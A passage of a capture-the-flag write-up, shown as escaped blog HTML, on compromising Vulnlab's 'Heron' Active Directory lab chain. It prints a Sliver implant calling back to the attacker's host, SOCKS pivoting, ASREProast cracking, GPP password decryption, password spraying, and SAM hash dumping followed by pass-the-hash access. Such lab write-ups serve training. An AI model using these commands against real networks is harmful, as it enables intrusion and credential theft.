0x7a8b61a266b3e6ba7b55725d51f2b723</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">_admin:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive more of an output, as Impacket will dump every password hash for domain user and machine account that is cached on the DC. Since we were able to dump the <code>_admin</code> hash, we should be able to simply authenticate to the machine and steal the root flag.</p>\n<p>The only stipulate is that WinRM is not enabled on this machine, and attempting to authenticate to RDP did not work when I tested it initially. We can still simply login to the <code>C$</code> SMB share with our admin hash and view the root flag. You can also use <code>smbexec</code> with the cached Kerberos ticket that we have to gain code execution to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\C$ -U &#x27;_admin&#x27; --pw-nt-hash (_ADMIN NT HASH)</span><br><span class=\"line\">......</span><br><span class=\"line\">smb: \\&gt; cd Users\\Administrator\\Desktop</span><br><span class=\"line\">smb: \\Users\\Administrator\\Desktop\\&gt; get root.txt</span><br><span class=\"line\">getting file \\Users\\Administrator\\Desktop\\root.txt of size 36 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ cat root.txt  </span><br><span class=\"line\">[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, now that we were able to read the root flag, that means we have compromised this machine!</p>\n<p><img src=\"/images/vulnlab/heron-vl/k.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>Big thanks to xct for the development of this machine, it really helped with strengthening domain-joined Linux attacks. I also have learned to remember to keep things simple, and always to make sure to check every last corner of the filesystems that you have access to.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/t0thkr1s/gpp-decrypt\">https://github.com/t0thkr1s/gpp-decrypt</a><br><a href=\"https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/\">https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</a><br><a href=\"https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9\">https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This is the newest chain in the medium difficulty that was created by xct, I’m going into this relatively blind so I hope I’ll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. </p>\n<p>I want to thank both xct and otter for their help on this during the initial access portion of the chain, overthinking is a common attribute to have when you start out as a red teamer so it’s important to keep it simple (at least that’s what I learned for initial access during this chain).</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s do our usual NMAP scans.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:48 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.128.117</span><br><span class=\"line\">Host is up (0.10s latency).</span><br><span class=\"line\">All 1000 scanned ports on 10.10.186.21 are in ignored states.</span><br><span class=\"line\">Not shown: 1000 filtered tcp ports (no-response)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 113.11 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:50 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.128.118</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 999 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds</span><br></pre></td></tr></table></figure>\n\n<p>There doesn’t seem to be much for us to work with here. From my first guess, every port within the domain controller <code>.21</code> is behind a firewall. This means we won’t be able to access it until after we have taken control of the first machine. Furthermore this also means we have no way to identify any users directly from the DC due to Kerberos not being accessible.</p>\n<p>We’ll have to start from SSH on the domain-joined Linux machine, as this seems to be the only port available. I also made sure to confirm this as the case with <code>rustscan</code>, which you can find <a href=\"https://github.com/RustScan/RustScan\">here</a>. It’s a modernized version of NMAP, and is used for discovering ports at an increased pace.</p>\n<p>Luckily enough I gave a quick peek at the Wiki page for the machine and it seems that this is an assumed-breach scenario. Heron Corp has given us credentials from which to use for our pen-test.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest:Heron123!</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ssh pentest@10.10.128.118</span><br><span class=\"line\">......</span><br><span class=\"line\">Last login: Fri Jun  7 10:34:38 2024 from 10.8.0.101</span><br><span class=\"line\">pentest@frajmp:~$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SOCKS-Proxy-to-the-DC\"><a href=\"#SOCKS-Proxy-to-the-DC\" class=\"headerlink\" title=\"SOCKS Proxy to the DC\"></a>SOCKS Proxy to the DC</h1><p>So as explained earlier, the first part of this chain is looking through the domain-joined Linux machine and understanding if there are any ways to elevate to root. Given that the first machine of this chain is through the Linux machine, I’m assuming that once we obtain root access we should have the ability to use the machine account and the <code>/etc/krb5.keytab</code> file (containing the machine account’s NT hash) to compromise the DC.</p>\n<p>However after a bit of file enumeration, you’ll notice that there isn’t really much for you to exploit initially. We don’t have access to any of the users (nor are there any binaries for us to exploit as the <code>pentest</code> user, however there are two domain users in the <code>/home</code> directory which are <code>svc-web-accounting</code> and <code>svc-web-accounting-d</code>. Since we have these users, we can try to kerberoast&#x2F;ASREProast to try and decrypt their plaintext passwords. In order to even do this though, we’ll need to interact with the DC.</p>\n<p>Since we don’t have access to the DC directly from our local machine, we can use a proxy determine if the jumpbox is able to connect to it due to it being within the scope of the firewall (or at least there seems to be a firewall active). We’ll need to start up a SOCKS proxy on the jumpbox in order to do this, and then execute our commands through the proxy. I usually opt to use <code>proxychains</code> for this, though you are free to use other tools that accomplish the same result.</p>\n<p>I’ll start up a <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server on our local Kali machine, I’m mainly doing this because Sliver has a built in SOCKS proxy command that should start a proxy on a given port easily. Firstly, we’ll need to create an implant and curl it to the jumpbox.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; generate --mtls (KALI IP) --os linux --arch amd64 --skip-symbols --save /home/daz/tech/vl/heron/writeup/ --name heron_lin</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/heron-vl/b.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Starting mTLS listener ...</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully started job #1</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 39b2e695 heron_lin - 10.10.128.118:37554 (frajmp.heron.vl) - linux/amd64 - Thu, 27 Jun 2024 23:34:54 EDT</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have an implant on the jumpbox, we can start up a SOCKS proxy as explained earlier using <code>socks5 start</code>. The default port for the proxy should be running on port 1081, though it may be different for others.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (heron_lin) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class=\"line\">⚠  In-band SOCKS proxies can be a little unstable depending on protocol</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the proxy running through the implant, we’ll need to edit our proxychains configuration file to reflect the port that the proxy is being served on. This can be found at either <code>/etc/proxychains.conf</code> or <code>/etc/proxychains4.conf</code>.</p>\n<p>The setting that we’ll need to change is at the bottom of the configuration file, denoted (with changes) from the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ProxyList]</span><br><span class=\"line\"># add proxy here ...</span><br><span class=\"line\"># meanwhile</span><br><span class=\"line\"># defaults set to &quot;tor&quot;</span><br><span class=\"line\">socks5 127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>Now that the configuration is set, you should be able to interact with the <code>proxychains4</code> (or <code>proxychains</code>) utility directly from Kali. This should be able to direct all of your tools to be executed within the space of the jumpbox instead of your local machine. Let’s verify that this works by running an NMAP scan for port 445 (SMB) on the DC (just due to this being a default port).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 nmap -sT -p445 10.10.128.117</span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 23:40 EDT</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:80  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">Nmap scan report for mucdc.heron.vl (10.10.128.117)</span><br><span class=\"line\">Host is up (0.22s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">445/tcp open  microsoft-ds</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems that the SMB port is open on the DC meaning that the firewall is indeed active. This means that most (if not, all) of our tooling will need to go through our proxy.</p>\n<p>Our next step is to scan the DC to determine what other ports are available on it. I used SMB as a dummy port for the test above (which we know came back as an open port) so we’ll look for ports aside from that.</p>\n<p>I’ve found that using NMAP through a SOCKS proxy is generally slow, due to having to go through the tunnel for each specific port. An easy workaround for this is scanning ports directly from jumpbox by dropping a binary to the machine. To prevent having to also recursively drop all of the libraries that NMAP uses, I decided to utilize an alternative being <a href=\"https://github.com/RustScan/RustScan\">rustscan</a>.</p>\n<p>We can upload the binary easily with Sliver’s <code>upload</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ chmod 777 rustscan</span><br><span class=\"line\">pentest@frajmp:/tmp$ ./rustscan -a 10.10.128.117</span><br><span class=\"line\">......</span><br><span class=\"line\">Open 10.10.128.117:389</span><br><span class=\"line\">Open 10.10.128.117:445</span><br><span class=\"line\">Open 10.10.128.117:464</span><br><span class=\"line\">Open 10.10.128.117:53</span><br><span class=\"line\">Open 10.10.128.117:80</span><br><span class=\"line\">Open 10.10.128.117:88</span><br><span class=\"line\">Open 10.10.128.117:135</span><br><span class=\"line\">Open 10.10.128.117:139</span><br><span class=\"line\">Open 10.10.128.117:593</span><br><span class=\"line\">Open 10.10.128.117:636</span><br><span class=\"line\">Open 10.10.128.117:3268</span><br><span class=\"line\">Open 10.10.128.117:3269</span><br><span class=\"line\">Open 10.10.128.117:3389</span><br><span class=\"line\">Open 10.10.128.117:9389</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the usual ports for a DC seem to be open (notably LDAP and RDP). However it seems as though a webserver is also open on the DC.</p>\n<h1 id=\"Tunneling-to-the-HTTP-Webserver-on-the-DC\"><a href=\"#Tunneling-to-the-HTTP-Webserver-on-the-DC\" class=\"headerlink\" title=\"Tunneling to the HTTP Webserver on the DC\"></a>Tunneling to the HTTP Webserver on the DC</h1><p>Before we interact with LDAP at all, I want to take a look to the at the webserver to see if there is anything for us to exploit initially.</p>\n<p>To ensure that we know the domain name of the DC (the jumpbox’s domain name is <code>frajmp</code> as seen in the SSH login), we can use <code>crackmapexec</code> to view the information with no credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.128.117                                </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:135  ...  OK</span><br><span class=\"line\">SMB         10.10.128.117   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)</span><br></pre></td></tr></table></figure>\n\n<p>As seen from the above, the DC’s domain name is <code>mucdc.heron.vl</code>. We’ll add this as well as <code>frajmp.heron.vl</code> to our <code>/etc/hosts</code> file to reflect any domain name resolutions that we might need in the future.</p>\n<p>We’ll need to use our SOCKS proxy to be able to access the webserver, which we can do by utilizing a separate profile in FoxyProxy. I usually use this solely for Burpsuite, so it’s a nice change of pace to be able to use FoxyProxy for another purpose. Let’s create another profile that uses the SOCKS proxy specifically.</p>\n<p><img src=\"/images/vulnlab/heron-vl/c.png\"></p>\n<p>Make sure that the <code>Port</code> and <code>Type</code> reflect the proxy accordingly. Once this profile is created, enable it through the FoxyProxy extension and attempt to access the webpage.</p>\n<p><img src=\"/images/vulnlab/heron-vl/d.png\"></p>\n<p>As you can see from the image, it seems that this webpage is the static landing page for Heron Corp. While there isn’t much to see here, we do have more users to add to our LDAP enumeration list that we’ll be trying to exploit shortly.</p>\n<p>Just to ensure that we aren’t missing any other web applications, let’s try to see if we can access any subdomains running on this port. I ran into some issues running <code>gobuster</code> through the proxy from our local machine (mainly the webserver crashing), so let’s try to do it from the jumpbox. Fortunately, <code>ffuf</code> does not use any additional libraries so I wouldn’t expect there to be any issues if we drop the sole binary to the jumpbox.</p>\n<p>We’ll also need to drop a subdomain wordlist to use alongside <code>ffuf</code>, I usually opt to use <code>subdomains-top1million-110000.txt</code> from <a href=\"https://github.com/danielmiessler/SecLists\">SecLists</a>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (heron_lin) &gt; upload /usr/bin/ffuf</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Wrote file to /tmp/ffuf</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (heron_lin) &gt; upload /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Wrote file to /tmp/subdomains-top1million-110000.txt</span><br></pre></td></tr></table></figure>\n\n<p>If you receive a timeout on the Sliver upload command for <code>ffuf</code>, disregard as it should still upload it to the machine.</p>\n<p>If we do run <code>ffuf</code> to enumerate subdomains, every request will come back with a 200 status code (indicating a false positive). We can avert this by excluding the size of the request that seems to be the same amongst all of the false positives using the <code>-fs</code> tag.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pentest@frajmp:/tmp$ ./ffuf -w subdomains-top1million-110000.txt -u http://heron.vl -H &quot;Host: FUZZ.heron.vl&quot; -fs 4128</span><br><span class=\"line\"></span><br><span class=\"line\">accounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 24ms]</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have received a <code>401</code> request for <code>accounting</code> as the subdomain, let’s see if we can browse to it to understand why this specific subdomain is encountering an error.</p>\n<p><img src=\"/images/vulnlab/heron-vl/e.png\"></p>\n<p>This subdomain seems to have authentication tied to it, meaning we won’t be able to access it until later on in the attack path.</p>\n<h1 id=\"ASREPRoasting-to-Crack-Passwords\"><a href=\"#ASREPRoasting-to-Crack-Passwords\" class=\"headerlink\" title=\"ASREPRoasting to Crack Passwords\"></a>ASREPRoasting to Crack Passwords</h1><p>Given the point that we’re at now, we should have a few users that we can test against to determine if any users are vulnerable to kerberoasting or ASREProasting. The user list at this point should look like the following. (Note that I added a few usernames that are regularly on Windows workstations, such as <code>Administrator</code> and <code>Guest</code>)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">Guest</span><br><span class=\"line\">svc-web-accounting-d</span><br><span class=\"line\">svc-web-accounting</span><br><span class=\"line\">wayne.wood</span><br><span class=\"line\">julian.pratt</span><br><span class=\"line\">samuel.davies</span><br></pre></td></tr></table></figure>\n\n<p>Let’s test for ASREProasting using Impacket’s <code>GetNPUsers</code> tool. Essentially what this will do is check if the <code>NO_PREAUTH_REQUIRED</code> is set to the user’s accounting. If this is set to a user account, we can essentially send an ASREQ to the KDC which will return an ASREP ticket that is encrypted with the users plaintext password.</p>\n<p>We’ll use the Guest account with no password to run this command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-GetNPUsers heron.vl/&#x27;Guest&#x27; -dc-ip 10.10.128.117 -no-pass -request -usersfile initial_ul.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:88  ...  OK</span><br><span class=\"line\">$krb5asrep$23$samuel.davies@HERON.VL:11082947e1ef[...snip...]e1316ef77fc294</span><br></pre></td></tr></table></figure>\n\n<p>As seen from above, a valid ASREP ticket was returned for the <code>samuel.davies</code> user. We can try to crack this using <code>hashcat</code> along with the specific hash ID (being 18200) as seen in the <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat wiki</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 samuel.davies.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">a6b5c3a4a77676b6134c9302e03726ef67af6288c07a47e44072e62fb80bad6d758edeacacfea413637179588c6a110a65570e84e9a9cf843663bd66f851e193a13943e1316ef77fc294:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>As seen from the above, we were able to successfully crack the password for <code>samuel.davies</code>. This opens up our attack path to a range of various options, notably dumping LDAP as my initial thought.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>Let’s now dump the domain with Bloodhound and the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>. We can examine any domain objects and also determine if <code>samuel.davies</code> has any privileges against other users. This should also increase our user list as you’ll see shortly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 bloodhound-python -d &#x27;heron.vl&#x27; -u &#x27;samuel.davies&#x27; -p &#x27;(SAMUEL.DAVIES PASSWORD)&#x27; -c all -ns 10.10.128.117 --zip</span><br><span class=\"line\">......</span><br><span class=\"line\">INFO: Compressing output into 20240628004605_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>We can now upload the compressed archive to Bloodhound after starting up the <code>neo4j</code> and <code>bloodhound</code> applications respectively.</p>\n<p>Upon viewing the domain objects, it does not seem that <code>samuel.davies</code> has any notable privileges to exploit in our situation. That being said, I did notice a privilege that one of the users on our current user list has.</p>\n<p><img src=\"/images/vulnlab/heron-vl/f.png\"></p>\n<p>It seems that the <code>svc-web-accounting</code> has <code>GenericWrite</code> privileges over the <code>MUCJMP</code> workstation. While it seems that this chain only consists of two machines, it seems that there could be other machine accounts that are present within the environment.</p>\n<p>I did some more enumeration on the other machine accounts present in LDAP, and it seems that this environment also has <code>ACCOUNTING-PREP</code> and <code>ACCOUNTING-STAG</code>.</p>\n<p>Moving on from this, I made sure to utilize <code>ldapsearch</code> through our SOCKS proxy to increase our user list. I’ve made a script to do this for us, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 ldapsearch -x -LLL -H ldap://mucdc.heron.vl -D &#x27;samuel.davies@heron.vl&#x27; -b &#x27;DC=heron,DC=vl&#x27; -w &#x27;(SAMUEL.DAVIES PASSWORD)&#x27; | grep userPrincipalName | awk &#x27;&#123;print $2&#125;&#x27; | cut -d &#x27;@&#x27; -f 1 &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>As we can see with the file created from <code>ldapsearch</code>, our user list has increased to over 20 users.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Katherine.Howard</span><br><span class=\"line\">Rachael.Boyle</span><br><span class=\"line\">Anthony.Goodwin</span><br><span class=\"line\">Carol.John</span><br><span class=\"line\">Rosie.Evans</span><br><span class=\"line\">Adam.Harper</span><br><span class=\"line\">Adam.Matthews</span><br><span class=\"line\">Steven.Thomas</span><br><span class=\"line\">Amanda.Williams</span><br><span class=\"line\">Vanessa.Anderson</span><br><span class=\"line\">Jane.Richards</span><br><span class=\"line\">Rhys.George</span><br><span class=\"line\">Mohammed.Parry</span><br><span class=\"line\">Julian.Pratt</span><br><span class=\"line\">Wayne.Wood</span><br><span class=\"line\">Danielle.Harrison</span><br><span class=\"line\">Samuel.Davies</span><br><span class=\"line\">Alice.Hill</span><br><span class=\"line\">Jayne.Johnson</span><br><span class=\"line\">Geraldine.Powell</span><br><span class=\"line\">adm_hoka</span><br><span class=\"line\">adm_prju</span><br><span class=\"line\">svc-web-accounting</span><br><span class=\"line\">svc-web-accounting-dev</span><br></pre></td></tr></table></figure>\n\n<p>We can test for kerberoasting&#x2F;ASREProasting for these users, to which you will find that <code>svc-web-accounting</code> is kerberoastable. That being said even if you do get an encrypted Kerberos TGT from them, you are unable to crack it (from just using rockyou).</p>\n<h1 id=\"Enumerating-SMB-Shares\"><a href=\"#Enumerating-SMB-Shares\" class=\"headerlink\" title=\"Enumerating SMB Shares\"></a>Enumerating SMB Shares</h1><p>I decided to move on from LDAP at this point, since it seems that we’ll need to compromise another user through another service if we want to move forward in the attack chain. Since we have credentials for <code>samuel.davies</code>, we can see if there are any shares that we have read access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 smbclient -L 10.10.128.117 -U &#x27;samuel.davies&#x27;                     </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK</span><br><span class=\"line\">Password for [WORKGROUP\\samuel.davies]:</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">accounting$     Disk      </span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class=\"line\">home$           Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">it$             Disk      </span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share </span><br><span class=\"line\">transfer$       Disk</span><br></pre></td></tr></table></figure>\n\n<p>As you can see it seems that there are a lot of shares that are on the DC. </p>\n<p>I’ll save us the time due to some prior enumeration that I did into this - it seems that we cannot access <code>accounting$</code> and <code>it$</code>, and <code>home$</code> and <code>transfer$</code> do not seem to have any files within any of their folders. </p>\n<p><code>CertEnroll</code> did seem suspicious at first, as there seems to be a few expired ADCS certifications that I initially thought could be reused for exploitation. I eventually deduced this to be a rabbit hole and moved elsewhere.</p>\n<p>The interesting part that I found however was in the <code>SYSVOL</code> share. I don’t normally find much in this share (aside from the logon script exploit that I did for <a href=\"https://dan-feliciano.com/2024/06/05/baby2/\">Baby2</a>), however it’s still important to enumerate everything possible in every share that you have access to for this service.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\heron.vl\\Policies\\&#123;6CC75E8D-586E-4B13-BF80-B91BEF1F221C&#125;\\Machine\\Preferences\\Groups\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Tue Jun  4 11:59:44 2024</span><br><span class=\"line\">  ..                                  D        0  Tue Jun  4 11:59:44 2024</span><br><span class=\"line\">  Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there is an XML file that we have read access to on the <code>SYSVOL</code> share. We’ll pull this down to our local machine to see if in contains any relevant information.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;Group clsid=&quot;&#123;6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7&#125;&quot; name=&quot;Administrators (built-in)&quot; image=&quot;2&quot; changed=&quot;2024-06-04 15:59:45&quot; uid=&quot;&#123;535B586D-9541-4420-8E32-224F589E4F3A&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; description=&quot;&quot; deleteAllUsers=&quot;0&quot; deleteAllGroups=&quot;0&quot; removeAccounts=&quot;0&quot; groupSid=&quot;S-1-5-32-544&quot; groupName=&quot;Administrators (built-in)&quot;&gt;&lt;Members&gt;&lt;Member name=&quot;HERON\\svc-web-accounting&quot; action=&quot;ADD&quot; sid=&quot;S-1-5-21-1568358163-2901064146-3316491674-24602&quot;/&gt;&lt;Member name=&quot;HERON\\svc-web-accounting-d&quot; action=&quot;ADD&quot; sid=&quot;S-1-5-21-1568358163-2901064146-3316491674-26101&quot;/&gt;&lt;/Members&gt;&lt;/Properties&gt;&lt;/Group&gt;</span><br><span class=\"line\">        &lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;Administrator (built-in)&quot; image=&quot;2&quot; changed=&quot;2024-06-04 16:00:13&quot; uid=&quot;&#123;F3B0115E-D062-46CC-B10C-C3EB743C824A&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;_local&quot; fullName=&quot;&quot; description=&quot;local administrator&quot; cpassword=&quot;[...snip...]&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (built-in)&quot;/&gt;&lt;/User&gt;</span><br><span class=\"line\">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The file itself seems to be configuring two of the domain user objects, specifically <code>svc-web-accounting</code> and <code>svc-web-accounting-d</code>. It seems that there also seems to be an encoded password for the “local administrator” user at the bottom of the file.</p>\n<p>I’ve seen this <code>cpassword</code> term before in other exploits that I’ve done in the past, and I do recall a tool that we can use to crack this password specifically. That tool is <a href=\"https://github.com/t0thkr1s/gpp-decrypt\">gpp-decrypt</a>. I’d tried to interpret the code a bit before doing it to understand what it was exactly doing. It seems that script takes the password and adds base64 padding to it before decoding the entire base64 string based on a specific AES key that is used for the <code>gpp</code> algorithm.</p>\n<p>We can use the Python POC without needing to use the setup script within the repository, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml </span><br><span class=\"line\"></span><br><span class=\"line\">                               __                                __ </span><br><span class=\"line\">  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_</span><br><span class=\"line\"> / _ `/  / _ \\  / _ \\/___// _  / / -_)/ __/ / __/ / // /  / _ \\/ __/</span><br><span class=\"line\"> \\_, /  / .__/ / .__/     \\_,_/  \\__/ \\__/ /_/    \\_, /  / .__/\\__/ </span><br><span class=\"line\">/___/  /_/    /_/                                /___/  /_/         </span><br><span class=\"line\"></span><br><span class=\"line\">[ * ] Username: Administrator (built-in)</span><br><span class=\"line\">[ * ] Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This returns a password for the built-in Administrator user (which is not the Administrator of the DC), so we’ll run this against our user list to see if the password corresponds to any users.</p>\n<p>Quick note, make sure to use the actual username for <code>svc-web-accounting-d</code> in the user list, as the LDAP command we used from before takes their display name which is <code>svc-web-accounting-dev</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec smb 10.10.128.117 -u full_ul.txt -p 